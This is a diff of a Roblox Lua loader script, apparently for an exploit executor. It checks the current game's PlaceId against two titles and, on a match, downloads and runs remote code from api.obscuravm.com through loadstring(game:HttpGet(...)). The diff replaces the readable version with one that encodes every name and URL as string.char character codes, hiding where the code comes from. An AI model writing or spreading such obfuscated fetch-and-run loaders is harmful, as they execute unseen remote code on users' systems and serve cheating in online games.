@@ -1,24 +1,27 @@
-getgenv().games = {}
-local market = game:GetService("MarketplaceService")
-
-local gameNow = tonumber(game.PlaceId)
-
-function addgame(nagame,idGame)
-  getgenv().games[tostring(nagame)] = tonumber(idGame)
+local a=string.char
+local b=table.concat
+local c=getfenv or function()return _ENV end
+local d=c()
+local e={}
+local f=game:GetService(a(77,97,114,107,101,116,112,108,97,99,101,83,101,114,118,105,99,101))
+local g=tonumber(game[a(80,108,97,99,101,73,100)])
+local h={}
+h[1]=a(83,116,101,97,108,95,97,110,69,103,103)
+h[2]=a(112,108,116)
+local i={}
+i[1]=107778070777162
+i[2]=117235735383048
+local j={}
+j[1]=a(104,116,116,112,115,58,47,47,97,112,105,46,111,98,115,99,117,114,97,118,109,46,99,111,109,47,115,99,114,105,112,116,115,47,55,52,48,50,54,54,54,48,51,54,53,53,48,49,49,48,53,56,51)
+j[2]=a(104,116,116,112,115,58,47,47,97,112,105,46,111,98,115,99,117,114,97,118,109,46,99,111,109,47,115,99,114,105,112,116,115,47,53,52,48,51,48,50,54,55,49,55,54,55,49,54,52,52,49,51,50)
+local k=a(103,97,109,101,115)
+d[k]={}
+for l=1,2 do
+    d[k][h[l]]=i[l]
 end
-
-
-addgame("Steal_anEgg",107778070777162)
-addgame("plt",117235735383048)
-
-
-if getgenv().games["Steal_anEgg"] == gameNow then 
-  print("Done Get game")
-  loadstring(game:HttpGet("https://api.obscuravm.com/scripts/7402666036550110583"))()
-elseif getgenv().games["plt"] == gameNow then
-  print("Done Geame Plt")
-  loadstring(game:HttpGet("https://api.obscuravm.com/scripts/5403026717671644132"))()
-else
-  print("not found games Hahaha",gameNow)
+for l=1,2 do
+    if d[k][h[l]]==g then
+        loadstring(game:HttpGet(j[l]))()
+        return
+    end
 end
-  
